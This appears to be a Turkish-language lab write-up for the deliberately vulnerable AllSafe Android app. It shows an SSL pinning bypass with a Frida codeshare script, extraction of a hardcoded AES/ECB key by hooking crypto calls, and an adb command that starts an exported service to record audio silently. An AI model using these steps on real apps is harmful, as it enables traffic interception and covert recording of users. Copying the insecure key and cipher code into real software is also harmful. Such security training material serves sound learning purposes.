**Zafiyet Tanımı** : Mobil uygulamada SSL/TLS sertifika doğrulaması için uygulanan Certificate Pinning mekanizması etkisiz hale getirilebilmektedir. Normal şartlarda certificate pinning, istemci ile sunucu arasındaki iletişimde yalnızca belirli bir sertifikaya güvenilmesini sağlar ve ortadaki adam (MitM) saldırılarını engeller. Ancak, uygulamada bu kontrolün atlatılabilmesi sonucunda, saldırgan tersine mühendislik, runtime hooking (Frida, Xposed) veya zayıf pinning implementasyonu kullanarak SSL trafiğini çözümleyebilir. Bu durum, uygulamanın güvenli iletişim mekanizmasını zayıflatır ve şifreli olması gereken verilerin (kullanıcı adı, parola, token, oturum bilgileri vb.) saldırgan tarafından ele geçirilmesine yol açar.

**Zafiyet Derecesi** : Yüksek

![](https://cdn-images-1.medium.com/max/2000/1*ZH14Mtz5EXZMWXjmtTjOKA.png)

Resimde görüldüğü üzere butona bastığımızda isteğimiz HTTPS üzerinden güvenli bir şekilde gidiyor. Amacımız bu isteğin bizim üzerimizden gitmesi.

![](https://cdn-images-1.medium.com/max/2000/1*z7qRvpNkqFQ_yCkePgHL7g.png)

Burp suite aracımızla sunucu ile istemci arasına girip isteği göndermeye çalıştığımız zaman bir sertifika problemi hatası alıyoruz. Araya girip sağlıklı bir şekilde istekleri görüp manipüle edebilmemiz için burada ssl pinning bypass yapmamız lazım. Bunu da frida aracımızı kullanarak yapacağız.

Bunun için scripti kendim yazmayacağım. Onun yerine internetten script araştıracağım. Bu sayede sizde script yazmanın dışında internetteki kaynaklardan da script araştırıp onları deneyimleyerek bypass etmeyi öğreneceksiniz.

[SSL Pinning Bypass scripti](https://codeshare.frida.re/@Q0120S/bypass-ssl-pinning/)

Script Frida ile yükleniyor ve uygulamanın içinde aşağıdaki yerlere **hook** atıyor:

* **Genel SSL Hataları**: SSLPeerUnverifiedException gibi hataları yakalayıp otomatik bypass ediyor.

* **HttpsURLConnection**: setSSLSocketFactory, setHostnameVerifier gibi metotları etkisiz hale getiriyor.

* **SSLContext** ve **TrustManager**: Uygulamanın güvenilir sertifika listesini boş/dummy trust manager ile değiştiriyor.

* **Android TrustManagerImpl (7.0+)**: checkTrustedRecursive, verifyChain fonksiyonlarını bypass ediyor

* **OkHTTP v3 **: CertificatePinner.check() metodlarını override ediyor.

Yukarıdaki linkini bıraktığım scripti deneyeceğim.

![](https://cdn-images-1.medium.com/max/2948/1*zrwq_oXHsseaSncYKUkq6w.png)

Scripti yukarıdaki gibi çalıştırıyoruz.

    frida --codeshare Q0120S/bypass-ssl-pinning -f YOUR_BINARY

Scripti nasıl çalıştıracağınız aslında scriptin yayınlandığı sayfada yazıyor. Bu komuta -U parametresi ile YOUR_BINARY yazan yere zafiyetli mobil uygulamamızın paket adını yazmamız gerekiyor.

![](https://cdn-images-1.medium.com/max/2000/1*ABom8i-iR28arx2b96gZVw.png)

![](https://cdn-images-1.medium.com/max/3838/1*10GXM4r9QvyhhzL4xQiHbA.png)

Burp suite aracında da gördüğümüz gibi isteğimiz üzerimizden geçiyor.

## **Zafiyet Adı** : Weak Cryptography

**Zafiyet Tanımı** : Uygulama, hassas verileri şifrelemek ve bütünlüğünü sağlamak için güvensiz kriptografik yöntemler kullanmaktadır.

* AES şifrelemesi ECB modu ile yapılmaktadır; bu mod veri blokları arasında öngörülebilirlik yaratır ve veri sızıntısına yol açabilir.

* MD5 algoritması kullanılmaktadır; MD5 günümüzde kolayca çakışmalar üretilebilir ve kırılabilir, dolayısıyla güvenli değildir.

* Sabit bir anahtar (KEY = "1nf053c4dv3n7ur3") kullanılması, şifrelemenin tahmin edilebilir ve kolayca geri çözülebilir olmasına sebep olur.

Bu durum, kullanıcıların gizli bilgilerini veya uygulama içi hassas verileri saldırganların ele geçirmesini kolaylaştırır.

**Zafiyet Derecesi** : Yüksek

    public static String encrypt(String value) {
            try {
                SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(StandardCharsets.UTF_8), "AES");
                Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");
                cipher.init(1, secretKeySpec);
                byte[] encrypted = cipher.doFinal(value.getBytes());
                return new String(encrypted);
            } catch (InvalidKeyException | NoSuchAlgorithmException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException e) {
                e.printStackTrace();
                return null;
            }
        }
    
        public static String md5Hash(String text) {
            StringBuilder stringBuilder = new StringBuilder();
            try {
                MessageDigest digest = MessageDigest.getInstance("MD5");
                digest.update(text.getBytes());
                byte[] messageDigest = digest.digest();
                stringBuilder.append(String.format("%032X", new BigInteger(1, messageDigest)));
            } catch (Exception e) {
                Log.d("ALLSAFE", e.getLocalizedMessage());
            }
            return stringBuilder.toString();
        }

Kodu incelediğimizde :

    public static final String KEY = "1nf053c4dv3n7ur3";

Anahtar sabit ve gömülü. Bu, herhangi birinin uygulama kodunu analiz ederek anahtarı elde edebileceği anlamına gelir.

    Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5PADDING");

ECB (Electronic Codebook) modu **bloklar arasında korelasyon bırakır** ve aynı veri blokları aynı şifrelenmiş bloklara dönüşür. Veriler tahmin edilebilir ve görsel analizle (pattern detection) çözülmeye müsaittir. ECB modu modern güvenlik standartlarına göre önerilmez; **CBC veya GCM** gibi modlar kullanılmalıdır.

    SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(StandardCharsets.UTF_8), "AES");
    cipher.init(1, secretKeySpec);

Her zaman aynı anahtar kullanılıyor. Anahtar yönetimi yapılmamış, random veya dinamik anahtar yok. Bir kez anahtar ele geçirilirse tüm şifreli veriler çözülebilir.

    MessageDigest digest = MessageDigest.getInstance("MD5");

MD5 artık kriptografik olarak güvenli bir hash algoritması değildir; çakışmalar (collision) üretmek kolaydır.

Android uygulamasının kullandığı Java Cryptography Extension (JCE) sınıflarına hook atan bir [script ](https://codeshare.frida.re/@fadeevab/intercept-android-apk-crypto-operations/)buldum. Yani uygulamanın şifreleme (crypto) işlemleri sırasında kullanılan anahtarları ve verileri görünür hale getiriyor.

![](https://cdn-images-1.medium.com/max/2902/1*gsRCZU6woXzocsORQyZDcA.png)

Önce scriptimizi çalıştıralım.

![](https://cdn-images-1.medium.com/max/2000/1*0DyiB-oZ_pd623Nhkapa3w.png)

Ardından uygulamada test yazıp “ENCRYPT” tuşuna basalım.

![](https://cdn-images-1.medium.com/max/2924/1*2sfHDHEmIWg1dWh34jnw4A.png)

Gördüğünüz üzere konsola geri dönüp tekrar baktığımızda şifrelemek istediğimiz veri ve anahtarı yakaladık.

    KEY: 316e6630353363346476336e37757233 | 1nf053c4dv3n7ur3
    CIPHER: AES/ECB/PKCS5PADDING
    Gotcha!
    test

KEY: 316e6630353363346476336e37757233

Bu kısım AES şifrelemesinde kullanılan anahtar.

Hexadecimal (16’lık) formatta yazılmış.

ASCII’ye çevirdiğinde şu string çıkıyor: 1nf053c4dv3n7ur3

Yani aslında key hem hex hem de string formatında verilmiş.

CIPHER: AES/ECB/PKCS5PADDING

Bu şifreleme işleminin hangi algoritma ile yapıldığını gösteriyor.

AES → Advanced Encryption Standard.

ECB → Electronic Codebook Mode (blokların birbirinden bağımsız şifrelenmesi; güvenlik açısından pek önerilmez).

PKCS5Padding → Şifreleme öncesi veriye padding (doldurma) yapılması.

Yani mesaj AES ile, ECB modunda ve PKCS5 padding kullanılarak şifreleniyor.

## **Zafiyet Adı** : Insecure Service

**Zafiyet Tanımı** : Android uygulamaları, bazı servislerini diğer uygulamalara açık bir şekilde sunabilir. Bu durum, exported özelliği yanlış yapılandırılmış servisler veya gereksiz izinlerle birlikte kullanıldığında saldırganların uygulamanın işlevlerine yetkisiz erişim sağlamasına olanak tanır. Bu zafiyet, hassas verilerin sızmasına, uygulama davranışının değiştirilmesine veya arka planda yetkisiz işlemlerin yürütülmesine yol açabilir. Özellikle servisler, Intent tabanlı iletişim ile tetiklenebiliyorsa, kötü niyetli uygulamalar tarafından kolayca manipüle edilebilir.

**Zafiyet Derecesi** : Yüksek

![](https://cdn-images-1.medium.com/max/2000/1*rf0EKCSOYlutuo307S7kvw.png)

    public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
            View view = inflater.inflate(R.layout.fragment_insecure_service, container, false);
            view.findViewById(R.id.start).setOnClickListener(new View.OnClickListener() { // from class: infosecadventures.allsafe.challenges.InsecureService$$ExternalSyntheticLambda0
                @Override // android.view.View.OnClickListener
                public final void onClick(View view2) {
                    InsecureService.this.lambda$onCreateView$0(view2);
                }
            });
            return view;
        }
    
        /* JADX INFO: Access modifiers changed from: private */
        public /* synthetic */ void lambda$onCreateView$0(View v) {
            if (ActivityCompat.checkSelfPermission(requireActivity(), "android.permission.RECORD_AUDIO") != 0 && ActivityCompat.checkSelfPermission(requireActivity(), "android.permission.READ_EXTERNAL_STORAGE") != 0 && ActivityCompat.checkSelfPermission(requireActivity(), "android.permission.WRITE_EXTERNAL_STORAGE") != 0) {
                ActivityCompat.requestPermissions(requireActivity(), new String[]{"android.permission.RECORD_AUDIO", "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE"}, 0);
            } else {
                requireActivity().startService(new Intent(requireActivity(), (Class<?>) RecorderService.class));
            }
        }

Kaynak kodu baktığımızda :

    requireActivity().startService(new Intent(requireActivity(), (Class<?>) RecorderService.class));

Bu satır, RecorderService isimli servisi başlatıyor. Sorun burada:

1. **Servisin güvenli şekilde sınırlanmaması**

* RecorderService servisi AndroidManifest.xml dosyasında exported="true" veya hiç belirtilmemişse Android 12 ve alt sürümlerde varsayılan olarak başka uygulamalar tarafından başlatılabilir.

* Yani başka bir uygulama, bu servisi kendi intent’ini kullanarak tetikleyebilir.

1. **Yetkisiz erişim riski**

* RecorderService muhtemelen mikrofon ve dosya okuma/yazma izinleri gerektiriyor (RECORD_AUDIO, READ/WRITE_EXTERNAL_STORAGE).

* Başka bir uygulama bu servisi çalıştırabilir ve kullanıcı haberi olmadan ses kaydı alabilir veya dosya yazabilir.

1. **İzin kontrolü eksikliği**

* Kod, yalnızca kendi uygulamasındaki izinleri kontrol ediyor.

* Servis başka bir uygulama tarafından çağrıldığında, servis içinde ek bir doğrulama yoksa (örn. checkCallingPermission) kötü niyetli bir uygulama tüm yetkilere erişebilir.

![](https://cdn-images-1.medium.com/max/2000/1*PtLMRQtooMIYQnI9iV33Rg.png)

Görüldüğü üzere RecorderService AndroidManifest.xml dosyasında exported=”true” olarak ayarlanmış. Bu da bu servisi başka uygulamalar ile tetiklenebileceği anlamına geliyor.

    public class RecorderService extends Service implements MediaRecorder.OnInfoListener {
        private MediaRecorder mediaRecorder;
    
        @Override // android.app.Service
        public void onCreate() {
            super.onCreate();
        }
    
        @Override // android.app.Service
        public int onStartCommand(Intent intent, int flags, int startId) {
            super.onStartCommand(intent, flags, startId);
            startRecording();
            return 1;
        }
    
        @Override // android.app.Service
        public IBinder onBind(Intent intent) {
            return null;
        }
    
        private void startRecording() {
            Toast.makeText(this, "Audio recording started!", 0).show();
            try {
                this.mediaRecorder = new MediaRecorder();
                this.mediaRecorder.setAudioSource(1);
                this.mediaRecorder.setMaxDuration(10000);
                this.mediaRecorder.setOutputFormat(2);
                this.mediaRecorder.setAudioEncoder(3);
                this.mediaRecorder.setAudioEncodingBitRate(64000);
                this.mediaRecorder.setAudioSamplingRate(16000);
                File outputFile = getOutputFile();
                this.mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
                this.mediaRecorder.prepare();
                this.mediaRecorder.start();
            } catch (Exception e) {
                Log.d("ALLSAFE", "Exception: " + e.getMessage());
            }
        }
    
        private void stopRecording() {
            try {
                if (this.mediaRecorder != null) {
                    this.mediaRecorder.stop();
                    this.mediaRecorder.reset();
                    this.mediaRecorder.release();
                    this.mediaRecorder = null;
                }
                stopSelf();
            } catch (Exception e) {
                Log.d("ALLSAFE", "Exception: " + e.getMessage());
            }
            Toast.makeText(getApplicationContext(), "Audio recording stopped!", 0).show();
        }
    
        private File getOutputFile() {
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US);
            String fullPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath() + "/allsafe_rec_" + dateFormat.format(new Date()) + ".mp3";
            Toast.makeText(getApplicationContext(), "File: " + fullPath, 0).show();
            return new File(fullPath);
        }
    
        @Override // android.media.MediaRecorder.OnInfoListener
        public void onInfo(MediaRecorder mr, int what, int extra) {
            stopRecording();
        }
    
        @Override // android.app.Service
        public void onDestroy() {
            super.onDestroy();
            stopRecording();
        }
    }

Yukarıda RecorderService sınıfına ait kodları görüyoruz.

Şimdi bu kodları inceleyelim.

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        startRecording();
        return 1;
    }

Burada servis doğrudan başlatılıyor ve startRecording() çağrılıyor.

Intent üzerinden gelen bilgiyi veya çağrı yapan uygulamayı kontrol etmiyor.

Eğer servis exported="true" ise, başka bir uygulama kötü niyetli olarak bu servisi başlatıp arbitrary (rastgele) kayıt yapabilir.

    private void startRecording() {
        Toast.makeText(this, "Audio recording started!", 0).show();
        try {
            this.mediaRecorder = new MediaRecorder();
            this.mediaRecorder.setAudioSource(1);
            this.mediaRecorder.setMaxDuration(10000);
            this.mediaRecorder.setOutputFormat(2);
            this.mediaRecorder.setAudioEncoder(3);
            this.mediaRecorder.setAudioEncodingBitRate(64000);
            this.mediaRecorder.setAudioSamplingRate(16000);
            File outputFile = getOutputFile();
            this.mediaRecorder.setOutputFile(outputFile.getAbsolutePath());
            this.mediaRecorder.prepare();
            this.mediaRecorder.start();
        } catch (Exception e) {
            Log.d("ALLSAFE", "Exception: " + e.getMessage());
        }
    }

Yetkisiz kayıt riski**: **Servis başka bir uygulama tarafından tetiklenirse, kullanıcı haberi olmadan mikrofon kaydı başlatılır.

İzin kontrolü eksikliği**: **ActivityCompat.checkSelfPermission() sadece activity’de kontrol edilmişti, servis içinde ek bir izin doğrulaması yok.

Dosya yolu hassasiyeti**:**

    File outputFile = getOutputFile(); 
    this.mediaRecorder.setOutputFile(outputFile.getAbsolutePath());

Dosya, Downloads klasörüne yazılıyor ve başka uygulamalar tarafından okunabilir.

Hassas ses kayıtları dışarı sızabilir.

    private File getOutputFile() {
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmssSSS", Locale.US);
        String fullPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
            .getAbsolutePath() + "/allsafe_rec_" + dateFormat.format(new Date()) + ".mp3";
        Toast.makeText(getApplicationContext(), "File: " + fullPath, 0).show();
        return new File(fullPath);
    }

Dosya dışa açık**:** Environment.getExternalStoragePublicDirectory herkesin erişebileceği bir yol.

Hassas veriler (mikrofon kayıtları) cihazdaki diğer uygulamalar tarafından okunabilir veya silinebilir.

    adb shell am startservice infosecadventures.allsafe/.challenges.RecorderService

Yukarıdaki komut ile RecorderService’ini uygulamayı açmadan başlatır ve ses kaydı yapabiliriz.

![](https://cdn-images-1.medium.com/max/2000/1*IBkx0XPRHyUM3VWSBzWhkA.png)

![](https://cdn-images-1.medium.com/max/2000/1*O5K4r1aUcud-hyPVFaPt9w.png)

